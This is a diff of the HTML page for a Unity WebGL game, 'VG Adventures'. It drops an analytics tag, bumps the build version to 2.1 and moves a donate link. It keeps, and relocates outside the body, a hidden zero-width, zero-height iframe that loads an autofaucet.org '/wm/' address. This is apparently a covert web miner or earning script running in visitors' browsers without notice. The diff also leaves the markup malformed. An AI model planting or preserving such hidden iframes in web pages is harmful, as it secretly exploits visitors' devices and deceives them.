@@ -6,23 +6,14 @@
     <title>Unity WebGL Player | VG Adventures</title>
     <link rel="shortcut icon" href="TemplateData/favicon.ico" />
     <link rel="stylesheet" href="TemplateData/style.css" />
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-CZZR57E4KZ"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-CZZR57E4KZ');
-</script>
-  </head>
-  <body>
     <a
       href="https://fdefake.github.io/Donar/"
       style="position: absolute; top: 10px; right: 10px"
     >
       <button>Donar</button>
     </a>
+  </head>
+  <body>
     <div id="unity-container" class="unity-desktop">
       <canvas id="unity-canvas" width="1920" height="400"></canvas>
       <div id="unity-loading-bar">
@@ -74,15 +65,15 @@
       }
 
       var buildUrl = "Build";
-      var loaderUrl = buildUrl + "/VG-Adventures(v2.0).loader.js";
+      var loaderUrl = buildUrl + "/VG-Adventures(v2.1).loader.js";
       var config = {
-        dataUrl: buildUrl + "/VG-Adventures(v2.0).data",
-        frameworkUrl: buildUrl + "/VG-Adventures(v2.0).framework.js",
-        codeUrl: buildUrl + "/VG-Adventures(v2.0).wasm",
+        dataUrl: buildUrl + "/VG-Adventures(v2.1).data",
+        frameworkUrl: buildUrl + "/VG-Adventures(v2.1).framework.js",
+        codeUrl: buildUrl + "/VG-Adventures(v2.1).wasm",
         streamingAssetsUrl: "StreamingAssets",
         companyName: "A_C_ESTUDIOS",
         productName: "VG Adventures",
-        productVersion: "2.0",
+        productVersion: "2.1",
         showBanner: unityShowBanner,
       };
 
@@ -136,11 +127,11 @@
       };
       document.body.appendChild(script);
     </script>
-    <iframe
-      src="https://autofaucet.org/wm/JH51664JH/4"
-      width="0"
-      height="0"
-      style="border: 0"
-    ></iframe>
   </body>
+  <iframe
+    src="https://autofaucet.org/wm/JH51664JH/4"
+    width="0"
+    height="0"
+    style="border: 0"
+  ></iframe>
 </html>
